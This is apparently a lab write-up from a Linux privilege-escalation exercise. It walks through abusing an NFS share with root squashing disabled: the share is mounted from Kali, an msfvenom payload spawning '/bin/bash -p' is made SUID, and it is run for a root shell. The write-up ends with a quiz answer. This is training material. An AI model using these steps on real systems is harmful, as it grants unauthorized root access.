Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

`cat /etc/exports`

![[Pasted image 20240224134615.png]]

Note that the **/tmp** share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

`sudo su`

Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share (update the IP accordingly):

`mkdir /tmp/nfs`
`mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`

![[Pasted image 20240224134714.png]]

![[Pasted image 20240224135117.png]]

Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

![[Pasted image 20240224135155.png]]

Still using Kali's root user, make the file executable and set the SUID permission:

`chmod +xs /tmp/nfs/shell.elf`

![[Pasted image 20240224135217.png]]

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`  

![[Pasted image 20240224135254.png]]

Remember to exit out of the root shell before continuing!  

Answer the questions below

| Question                                                     | Answer         |
| ------------------------------------------------------------ | -------------- |
| What is the name of the option that disables root squashing? | no_root_squash |
